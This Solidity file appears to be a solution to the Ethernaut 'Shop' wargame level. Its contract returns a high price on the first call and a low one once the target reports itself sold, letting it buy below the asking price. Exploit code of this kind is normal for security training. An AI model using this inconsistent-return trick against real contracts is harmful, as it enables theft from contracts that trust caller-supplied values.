// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 21: Shop
// https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB

contract Shop_Hack {
  address shopInstance;

  constructor(address _shopInstance) {
    shopInstance = _shopInstance;
  }

  function price() public view returns (uint) {
    IShop shop = IShop(shopInstance);
    return shop.isSold() ? 1 : 100;
  }

  function buy() public {
    IShop shop = IShop(shopInstance);
    shop.buy();
  }
}

interface IShop {
  function isSold() external view returns (bool);
  function buy() external;
}